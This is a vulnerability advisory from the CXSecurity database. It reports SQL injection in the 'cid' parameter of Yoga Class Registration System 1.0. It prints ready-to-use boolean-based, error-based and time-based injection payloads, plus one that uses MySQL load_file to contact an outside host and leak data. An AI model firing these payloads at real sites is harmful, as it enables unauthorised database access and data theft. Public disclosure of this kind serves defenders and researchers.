---
title: Yoga Class Registration 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023030047
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-23
fetch_date: 2025-10-04T10:20:34.739089
---

# Yoga Class Registration 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Yoga Class Registration 1.0 SQL Injection** **2023.03.22**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

## Title: Yoga Class Registration -1.0-2023 - Multiple SQLi
## Author: nu11secur1ty
## Date: 02.27.2023
## Vendor: https://github.com/oretnom23
## Software: https://www.sourcecodester.com/php/16097/yoga-class-registration-system-php-and-mysql-free-source-code.html
## Reference: https://portswigger.net/web-security/sql-injection
## Description:
The `cid` parameter appears to be vulnerable to Multiple-SQL injection
attacks. The payload '+(select
load\_file('\\\\aaob4nk5vd0lv9e50qp2c5c1dsjl7iv9yxpkg85.stupid.com\\shs'))+'
was submitted in the cid parameter. This payload injects a SQL
sub-query that calls MySQL's load\_file function with a UNC file path
that references a URL on an external domain.
The attacker easily can steal all information about this server and
this could be awful for all users of this system.
STATUS: HIGH Vulnerability - CRITICAL
[+]Payload:
```mysql
---
Parameter: cid (GET)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: p=yclasses/registration&cid=158158925' or '6060'='6060'
AND 7469=7469 AND 'IrlM'='IrlM
Type: error-based
Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or
GROUP BY clause (FLOOR)
Payload: p=yclasses/registration&cid=158158925' or '6060'='6060'
AND (SELECT 6894 FROM(SELECT COUNT(\*),CONCAT(0x71786b7071,(SELECT
(ELT(6894=6894,1))),0x716a6a7871,FLOOR(RAND(0)\*2))x FROM
INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a) AND 'CykB'='CykB
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: p=yclasses/registration&cid=158158925' or '6060'='6060'
AND (SELECT 9785 FROM (SELECT(SLEEP(3)))edGv) AND 'KLgd'='KLgd
---
```
## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/2023/Yoga-Class-Registration%20-1.0-2023%20-%20Multiple-SQLi)
## Proof and Exploit:
[href](https://streamable.com/hhcgg6)
## Time spend:
01:00:00

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030047)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 -1

0%

100%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top